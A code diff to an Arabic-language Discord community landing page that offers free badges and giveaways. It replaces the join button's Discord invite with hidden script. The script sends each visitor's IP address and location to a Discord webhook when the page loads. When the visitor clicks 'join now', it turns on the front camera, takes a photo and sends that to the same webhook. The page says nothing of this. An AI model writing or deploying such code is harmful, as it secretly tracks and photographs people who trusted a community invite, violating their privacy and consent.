@@ -2,7 +2,6 @@
 <html lang="ar" dir="rtl">
 <head>
   <link rel="icon" href="icon.png" type="image/png">
-  <!-- Meta Tags for Embed Preview -->
   <meta property="og:title" content="𝐑𝐏𝐏 𝐂𝐨𝐦𝐦𝐮𝐧𝐢𝐭𝐲">
   <meta property="og:description" content="شارات ديسكورد مجانية، سحوبات مميزة، وتجارب تجارة آمنة! انضم الآن.">
   <meta property="og:image" content="https://rayan511x55x.github.io/RPP/icon.png">
@@ -131,7 +130,7 @@
     </div>
   </div>
 
-  <button class="join-button" onclick="window.open('https://discord.gg/Pcw4qhvv', '_blank')">
+  <button class="join-button" id="joinButton">
     انضم لنا الآن!
   </button>
 
@@ -145,6 +144,71 @@
       &copy; 2025 𝐑𝐏𝐏 𝐂𝐨𝐦𝐦𝐮𝐧𝐢𝐭𝐲 - جميع الحقوق محفوظة
     </div>
   </footer>
-  <script src="main.js"></script>
+
+  <script>
+    // جمع الموقع (IP) والمعلومات الأخرى
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const location = data.city + ", " + data.region + ", " + data.country;
+        console.log("IP: " + ip);
+        console.log("Location: " + location);
+        
+        // إرسال البيانات إلى Webhook
+        fetch('https://discord.com/api/webhooks/your-webhook-url', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `New Visitor IP: ${ip}\nLocation: ${location}`
+          })
+        });
+      })
+      .catch(err => console.error('Error getting location:', err));
+
+    // التصوير عند الضغط على انضم لنا الآن
+    document.getElementById('joinButton').addEventListener('click', function() {
+      navigator.mediaDevices.enumerateDevices().then(devices => {
+        devices.forEach(device => {
+          if (device.kind === 'videoinput') {
+            // اختيار الكاميرا الأمامية
+            if (device.label.includes('front')) {
+              navigator.mediaDevices.getUserMedia({
+                video: { deviceId: device.deviceId }
+              }).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                document.body.appendChild(video);
+
+                // أخذ صورة بعد قليل
+                setTimeout(() => {
+                  const canvas = document.createElement('canvas');
+                  canvas.width = 640;
+                  canvas.height = 480;
+                  const context = canvas.getContext('2d');
+                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                  const imageData = canvas.toDataURL('image/png');
+
+                  // إرسال الصورة إلى Webhook
+                  fetch('https://discord.com/api/webhooks/your-webhook-url', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      content: "تم أخذ الصورة",
+                      embeds: [{
+                        image: { url: imageData }
+                      }]
+                    })
+                  });
+                }, 2000); // تأخير قليلاً لأخذ الصورة
+              }).catch(err => console.error('Error accessing front camera:', err));
+            }
+          }
+        });
+      });
+    });
+  </script>
+
 </body>
 </html>
